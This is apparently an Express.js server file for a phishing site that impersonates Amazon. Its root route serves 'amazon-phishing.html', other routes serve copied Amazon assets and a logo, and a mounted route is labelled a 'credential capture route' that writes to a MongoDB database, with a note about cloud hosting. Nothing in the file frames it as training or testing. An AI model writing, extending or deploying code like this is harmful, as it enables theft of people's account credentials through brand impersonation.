require('dotenv').config();
const express = require('express');
const path = require('path');
const cors = require('cors');
const connectDB = require('./src/config/db');

const trackRoutes = require('./src/routes/trackRoutes');
const adminRoutes = require('./src/routes/adminRoutes');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Trust proxy for Render/other cloud platforms
app.set('trust proxy', true);

// Serve Amazon phishing page - main entry point
app.get('/', (req, res) => {
  const filePath = path.join(__dirname, 'public', 'amazon-phishing.html');
  res.sendFile(filePath);
});

// Serve Amazon assets
app.get('/amazon/assets/:filename', (req, res) => {
  const filename = req.params.filename;
  const assetPath = path.join(__dirname, 'public', 'amazon', 'assets', filename);
  res.sendFile(assetPath, (err) => {
    if (err) {
      res.status(404).send('Asset not found');
    }
  });
});

// Serve Amazon logo image
app.get('/amazon_image.png', (req, res) => {
  const imagePath = path.join(__dirname, 'public', 'amazon_image.png');
  res.sendFile(imagePath, (err) => {
    if (err) {
      res.status(404).send('Image not found');
    }
  });
});

// Mount only credential capture route (no admin routes)
app.use('/api/admin', adminRoutes);

// Health check endpoint
app.get('/api/health', (req, res) => {
  res.json({ status: 'online' });
});

// Start Server
async function startServer() {
  await connectDB();

  app.listen(PORT, () => {
    console.log(`=======================================================`);
    console.log(`� Login Page Running`);
    console.log(`📡 URL: http://localhost:${PORT}`);
    console.log(`� MongoDB Atlas Connected`);
    console.log(`=======================================================`);
  });
}

startServer();
